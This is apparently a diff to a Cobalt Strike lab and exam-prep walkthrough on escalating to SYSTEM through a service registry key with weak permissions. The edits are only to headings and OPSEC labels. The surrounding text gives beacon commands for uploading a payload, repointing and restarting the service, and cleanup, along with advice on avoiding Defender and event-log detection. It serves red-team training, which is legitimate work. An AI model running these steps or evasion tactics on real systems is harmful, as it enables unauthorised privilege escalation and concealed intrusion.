@@ -30,7 +30,7 @@ A medium-integrity beacon lets you enumerate, but SYSTEM is the operational pivo
 Windows services store their configuration in `HKLM\SYSTEM\CurrentControlSet\Services\<name>`. The `ImagePath` value is what the Service Control Manager executes when the service starts. If a low-privileged group (`Everyone`, `BUILTIN\Users`, `Authenticated Users`) has `FullControl` on that registry key, they can overwrite `ImagePath` with any executable — and when the service starts, it runs as SYSTEM.
 
 This is a misconfiguration, not an exploit. No CVE, no patch bypass, no kernel interaction. It is:
-- `OPSEC-CAUTION` (not UNSAFE) — the escalation generates service start/stop events, not a suspicious process injection
+- `OPSEC-🟠CAUTION`  the escalation generates service start/stop events, not a suspicious process injection
 - Reliable — if the permission exists, it works
 - Reversible — you restore the original binary path after getting the beacon
 
@@ -40,7 +40,7 @@ This is a misconfiguration, not an exploit. No CVE, no patch bypass, no kernel i
 
 Before running any commands, you need to understand `spawnto` because it is set twice in this lab for two different reasons. Confusion between these two uses is one of the most common mistakes when preparing for the exam.
 
-### What Fork & Run Is
+### Fork & Run
 
 When you run `execute-assembly`, `powerpick`, `mimikatz`, or `portscan`, Cobalt Strike does **not** run that code inside the beacon process itself. Instead it:
 
@@ -56,7 +56,7 @@ The child process is called the **sacrificial process** — it is disposable. If
 
 **`spawnto` answers: "what process do I spawn when I need to run a post-ex task?"**
 
-### The Default Problem
+### Default Problem
 
 Without setting `spawnto`, CS spawns `rundll32.exe` as the sacrificial process for every fork & run command:
 
@@ -68,7 +68,7 @@ beacon process
 
 `rundll32.exe` spawned as a child of your beacon is one of Cobalt Strike's most well-known default indicators. It is in Defender's behavioural rules, Sigma detection rules, and the exam OPSEC scoring explicitly checks for default CS indicators — this is a direct point deduction.
 
-### The Three Separate `spawnto` Controls
+### `spawnto` Controls
 
 This is the source of confusion. There are **three completely independent controls** with similar names:
 
@@ -121,7 +121,7 @@ Edge spawns many child processes by design — renderer processes, GPU processes
 **Why this is set here and not later:**
 `powerpick` is the very next command. If you do not set `spawnto` first, `powerpick` will spawn `rundll32.exe` as the default sacrificial process — a signatured CS indicator — before you have a chance to change it. The order is: configure first, execute second.
 
-> **OPSEC:** `OPSEC-SAFE` — `spawnto x64` only sets a value inside the beacon. No process is spawned at this step, no event logs are generated.
+> **OPSEC:** `OPSEC-🟢SAFE` — `spawnto x64` only sets a value inside the beacon. No process is spawned at this step, no event logs are generated.
 
 ---
 
@@ -143,7 +143,7 @@ Inherited ACEs flow down from parent keys via Windows ACL inheritance. A non-inh
 **Why `FullControl` specifically:**
 `FullControl` on a registry key includes `SetValue` permission, which is what you need to overwrite `ImagePath`. Lower rights (`ReadKey`, `QueryValues`) are not exploitable for this technique.
 
-**OPSEC classification:** `OPSEC-CAUTION`
+**OPSEC classification:** `OPSEC-🟠CAUTION`
 - `powerpick` uses fork & run — spawns `msedge.exe` as the sacrificial process (per `spawnto` set above)
 - Event 4688 (process creation) fires for the `msedge.exe` child — normal on a workstation where Edge is running
 - The PowerShell code queries the registry via `Get-Acl` — no known Defender signature for this specific query
@@ -187,7 +187,7 @@ The `spawnto` beacon command has zero effect on a service binary that hasn't loa
 **Why `svchost.exe` for service payloads:**
 `svchost.exe` is the Windows service host — the legitimate process that hosts most Windows services. The parent chain becomes `services.exe → http_x64.svc.exe → svchost.exe`. An EDR evaluating this chain sees a service binary spawning a service host — consistent with a service that delegates work to a subprocess. It is the most contextually appropriate process for a SYSTEM service execution context.
 
-> **OPSEC:** `OPSEC-SAFE` — `ak-settings` only sets a configuration value. No process spawned, no event logs.
+> **OPSEC:** `OPSEC-🟢SAFE` — `ak-settings` only sets a configuration value. No process spawned, no event logs.
 
 ---
 
@@ -217,7 +217,7 @@ beacon> sc_stop BadWindowsService
 **Why stop it first:**
 You cannot reliably change the `ImagePath` of a running service and have the SCM use the new path. Stopping the service first ensures no handle contention on the registry key, and when `sc_start` runs later the SCM reads the freshly-written `ImagePath` from scratch.
 
-**OPSEC:** `OPSEC-CAUTION` — Event 7036 (service changed to stopped state) fires in the System event log.
+**OPSEC:** `OPSEC-🟠CAUTION` — Event 7036 (service changed to stopped state) fires in the System event log.
 
 ---
 
@@ -231,7 +231,7 @@ beacon> upload C:\Payloads\http_x64.svc.exe
 **Why `C:\Temp`:**
 Writable by low-privileged users, confirmed in this lab environment. Use the least-monitored writable path available. Avoid `C:\Windows\Temp` (more aggressively monitored) and user profile paths (tied to a specific user identity).
 
-**OPSEC:** `OPSEC-CAUTION` — File write to disk. This is the highest-risk moment in the entire technique. Defender real-time protection scans on write. If Artifact Kit is clean, the file survives. If not, Defender blocks it here before the service ever starts.
+**OPSEC:** `OPSEC-🟠CAUTION` — File write to disk. This is the highest-risk moment in the entire technique. Defender real-time protection scans on write. If Artifact Kit is clean, the file survives. If not, Defender blocks it here before the service ever starts.
 
 ---
 
@@ -264,7 +264,7 @@ beacon> sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
 **What this writes:**
 `HKLM\SYSTEM\CurrentControlSet\Services\BadWindowsService\ImagePath` = `C:\Temp\http_x64.svc.exe`
 
-**OPSEC:** `OPSEC-CAUTION` — Registry write. Event 4657 (registry value modified) fires if object access auditing is enabled on the target. This is a medium-signal event — a SOC monitoring service `ImagePath` changes would catch this.
+**OPSEC:** `OPSEC-🟠CAUTION` — Registry write. Event 4657 (registry value modified) fires if object access auditing is enabled on the target. This is a medium-signal event — a SOC monitoring service `ImagePath` changes would catch this.
 
 ---
 
@@ -281,7 +281,7 @@ beacon> sc_start BadWindowsService
 4. Stub spawns `svchost.exe` (per `ak-settings`) and injects beacon shellcode into it
 5. Beacon shellcode runs inside `svchost.exe` as SYSTEM → calls back to team server → new SYSTEM beacon appears in CS
 
-**OPSEC classification:** `OPSEC-CAUTION`
+**OPSEC classification:** `OPSEC-🟠CAUTION`
 
 | Event | ID | Why generated | Significance |
 |-------|----|---------------|--------------|
@@ -289,7 +289,7 @@ beacon> sc_start BadWindowsService
 | New service installed | **7045** | **NOT generated** — you modified existing service | **Critical** — no 7045 = no explicit OPSEC deduction |
 | Process creation | 4688 | `http_x64.svc.exe` starts, then `svchost.exe` starts | Visible to EDR — mitigated by `ak-settings svchost.exe` |
 
-> **The absence of Event 7045 is the key OPSEC advantage of this technique over `jump psexec64`.** Modifying an existing service versus installing a new one is the difference between CAUTION and UNSAFE.
+> **The absence of Event 7045 is the key OPSEC advantage of this technique over `jump psexec64`.** Modifying an existing service versus installing a new one is the difference between CAUTION and OPSEC-🔴UNSAFE.
 
 > Immediately move to cleanup after the SYSTEM beacon checks in.
 
@@ -320,16 +320,16 @@ Returns the environment to its pre-attack state. No visible difference from befo
 
 | Step | Command | Tier | Events generated | Key mitigation |
 |------|---------|------|-----------------|----------------|
-| Set fork & run spawnto | `spawnto x64 msedge.exe` | SAFE | None | Set before any powerpick/execute-assembly |
+| Set fork & run spawnto | `spawnto x64 msedge.exe`  | OPSEC-🟢SAFE | None | Set before any powerpick/execute-assembly |
 | Enumerate service ACLs | `powerpick $lowpriv...` | CAUTION | 4688 (msedge.exe child) | spawnto = context-appropriate process |
-| Set service payload spawnto | `ak-settings spawnto_x64 svchost.exe` | SAFE | None | Must be set before generating service EXE |
+| Set service payload spawnto | `ak-settings spawnto_x64 svchost.exe`  | OPSEC-🟢SAFE | None | Must be set before generating service EXE |
 | Stop service | `sc_stop` | CAUTION | 7036 (stopped) | Consistent with maintenance |
 | Upload payload | `upload` | CAUTION | Defender scan on write | Artifact Kit must be loaded |
-| Record config | `sc_qc` | SAFE | None | Record before modifying |
+| Record config | `sc_qc`  | OPSEC-🟢SAFE | None | Record before modifying |
 | Reconfigure service | `sc_config` (payload) | CAUTION | 4657 (if auditing on) | Keep window short |
 | Start service | `sc_start` | CAUTION | 7036, 4688 — **no 7045** | ak-settings for process chain |
 | Restore service | `sc_config` (restore) | CAUTION | 4657 | Removes residual artifact |
-| Delete payload | `rm` | SAFE | File deletion | Removes disk artifact |
+| Delete payload | `rm`  | OPSEC-🟢SAFE | File deletion | Removes disk artifact |
 
 **No Event 7045 is generated.** That is the exam-critical distinction. All other events are consistent with a service restart cycle.
 
